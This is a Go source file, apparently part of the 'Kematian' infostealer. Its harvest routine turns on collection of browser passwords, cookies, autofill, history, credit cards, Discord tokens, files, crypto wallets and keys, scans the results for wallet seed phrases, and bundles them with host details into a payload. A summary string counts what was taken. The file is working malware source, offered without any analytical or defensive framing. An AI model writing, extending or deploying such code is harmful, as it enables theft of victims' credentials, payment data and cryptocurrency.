package main

import (
	"runtime"
	"sync"

	"recovery/recovery"
)

type harvestPayload struct {
	Hostname string                    `json:"hostname"`
	OS       string                    `json:"os"`
	Arch     string                    `json:"arch"`
	Result   *recovery.CollectionResult `json:"result"`
	Seeds    []recovery.SeedResult     `json:"seeds,omitempty"`
}

func fullCollectOptions() recovery.CollectOptions {
	opts := recovery.CollectOptions{Browsers: true}
	opts.Passwords = true
	opts.Cookies = true
	opts.Autofill = true
	opts.History = true
	opts.Bookmarks = true
	opts.CreditCards = true
	opts.Discord = true
	opts.Files = true
	opts.Wallets = true
	opts.Keys = true
	return opts
}

func runHarvest(hostname string) (*harvestPayload, error) {
	opts := fullCollectOptions()

	var extensions []recovery.ExtensionResult
	var extWg sync.WaitGroup
	extWg.Add(1)
	go func() {
		defer extWg.Done()
		extensions = recovery.ScanExtensions()
	}()

	result, err := recovery.Collect(opts, nil)
	if err != nil {
		return nil, err
	}

	extWg.Wait()
	result.Extensions = extensions

	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)

	return &harvestPayload{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Result:   result,
		Seeds:    seeds,
	}, nil
}

func harvestSummary(p *harvestPayload) string {
	if p == nil || p.Result == nil {
		return "Harvest complete (empty)"
	}
	r := p.Result
	return formatSummary(
		p.Hostname, p.OS, p.Arch,
		len(r.Passwords), len(r.Cookies), len(r.Autofill), len(r.History),
		len(r.Bookmarks), len(r.CreditCards), len(r.DiscordTokens), len(r.Extensions),
		len(r.Wallets), len(r.Keys), len(p.Seeds),
	)
}

func formatSummary(host, osName, arch string, pw, ck, af, hi, bk, cc, dt, ex, wl, keys, seeds int) string {
	return "Kematian harvest — " + host + " (" + osName + "/" + arch + ")\n" +
		"passwords: " + itoa(pw) + " | cookies: " + itoa(ck) + " | autofill: " + itoa(af) + "\n" +
		"history: " + itoa(hi) + " | bookmarks: " + itoa(bk) + " | cards: " + itoa(cc) + "\n" +
		"discord: " + itoa(dt) + " | wallet extensions: " + itoa(ex) + " | desktop wallets: " + itoa(wl) + "\n" +
		"keys: " + itoa(keys) + " | seeds: " + itoa(seeds)
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var buf [20]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}